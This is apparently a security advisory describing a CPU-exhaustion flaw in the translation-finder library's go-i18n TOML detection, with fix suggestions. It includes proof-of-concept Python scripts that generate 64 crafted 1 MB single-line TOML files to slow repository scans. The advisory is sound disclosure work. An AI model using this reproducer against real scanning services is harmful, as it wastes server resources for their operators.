## Vulnerability Details

The `translation-finder` library has a function that checks TOML files to see if they are go-i18n format files. This function reads the file one character at a time in a loop. If a TOML file has one very long line (around 1 MB), this check takes about 0.1 to 0.15 seconds to run.
 
An attacker can create a repository with about 64 files like this. When a tool like Weblate scans this repository using `discover()`, it takes about 7 seconds to finish, instead of a few milliseconds. The built in budget system limits the damage to around 7 to 8 seconds per scan, but this cost is easy to trigger and repeat.
 
**Affected project:** WeblateOrg/translation-finder
**Affected version:** 3.7.1
**Affected commit:** `aa9017b412c521ca794564bf3e1bfa4e2b3c280b`
**Affected file:** `translation_finder/discovery/files.py`
**Affected functions:** `_toml_line_code()` and `_is_go_i18n_toml()`
 
## Steps to Reproduce
 
**Environment used:** Python 3 (fish shell), local clone of the repository, installed with `pip install -e .`
 
### Step 1: Clone the repository and confirm the commit
 
```bash
git clone https://github.com/WeblateOrg/translation-finder.git
cd translation-finder
git log -1
pip install -e . --break-system-packages
```
 
### Step 2: Run a baseline test with a normal, small repository
 
```fish
set -x PYTHONPATH .
 
time python3 -c "
import tempfile, time
from pathlib import Path
from translation_finder.api import discover
 
with tempfile.TemporaryDirectory() as tmpdir:
    root = Path(tmpdir)
    for i in range(5):
        d = root / f'proj{i}'
        d.mkdir()
        (d / 'en.po').write_text('msgid \"a\"\nmsgstr \"b\"\n')
    t0 = time.time()
    results = discover(str(root))
    print(f'BASELINE elapsed: {time.time()-t0:.4f}s, results: {len(results)}')
"
```
 
This finishes in a few milliseconds. This is the normal, expected speed.
 
### Step 3: Run the crafted repository test
 
Create 64 folders. Each folder has one TOML file with a single line about 1 MB long.
 
```fish
set -x PYTHONPATH .
 
time python3 -c "
import tempfile, time
from pathlib import Path
from translation_finder.api import discover
 
with tempfile.TemporaryDirectory() as tmpdir:
    root = Path(tmpdir)
    big_toml = '\"' + 'x' * (1024 * 1024 - 10) + '\"'
    for i in range(64):
        d = root / f'proj{i}'
        d.mkdir()
        (d / 'en.toml').write_text(big_toml)
        (d / 'fr.toml').write_text('\"hello\"')
    t0 = time.time()
    results = discover(str(root))
    elapsed = time.time() - t0
    print(f'MALICIOUS REPO elapsed: {elapsed:.2f}s, results: {len(results)}')
"
```
 
**Result:** elapsed time of about 7.16 seconds, instead of a few milliseconds. The `usr time` is almost equal to `real time`, which shows the CPU is busy the whole time, not waiting on disk or network.
 
### Step 4: Confirm the delay does not grow with a bigger repository
 
Repeat Step 3 but use 200 folders instead of 64.
 
**Result:** elapsed time of about 7.20 seconds, almost the same as Step 3 with only 64 folders. This shows the delay is capped by the tool's own internal budget, not by how big the malicious repository is. This means an attacker does not need a large repository. A small one with about 64 crafted files is enough to cause the full delay.
 
### Step 5: Confirm the exact function causing the delay
 
```fish
set -x PYTHONPATH .
 
python3 -c "
import time
from translation_finder.discovery.files import _is_go_i18n_toml
 
big_toml = '\"' + 'x' * (1024 * 1024 - 10) + '\"'
t0 = time.time()
result = _is_go_i18n_toml(big_toml)
elapsed = time.time() - t0
print(f'_is_go_i18n_toml() time: {elapsed:.3f}s, result={result}')
"
```
 
**Result:** about 0.119 seconds for one file. Multiplied by 64 files, this is close to the total delay seen in Step 3 and Step 4. This confirms the delay comes from this one function.

## Impact

- A repository with about 64 crafted TOML files causes the `discover()` function to take about 7 to 8 seconds, instead of milliseconds.
- `discover()` is meant to be used by tools like Weblate to scan repositories automatically, for example when a new repository or component is added, or when a repository is scanned again after a push.
- An attacker only needs to add a small number of large, single line TOML files to a repository. They do not need write access to the server, only the ability to get their repository content scanned (for example, by submitting it as a project, or contributing to a repository that gets rescanned).
- If this scan runs often, for example on every push or every scheduled scan, this becomes a repeatable way to waste CPU time on the server doing the scanning.
- This is a CPU exhaustion issue. It does not read files outside the repository, does not leak data, and does not allow code execution. The damage is limited by the tool's own budget system to around 7 to 8 seconds per scan.
## Remediation
 
The root cause is in `_toml_line_code()`. This function reads a line of text one character at a time in a Python loop. For very long lines, this becomes slow because there is no limit on how long a single line can be before the function starts working on it.
 
**Suggested fix 1:** Add a maximum line length check before running the character by character scan. If any line in the file is longer than a reasonable limit (for example, 4096 characters), skip the TOML check for that file. Normal go-i18n TOML files do not have single lines that are 1 MB long.
 
**Suggested fix 2:** Replace the manual character by character loop with a faster method, such as using regular expressions or built in string search functions, so that scanning long lines does not cost as much CPU time.
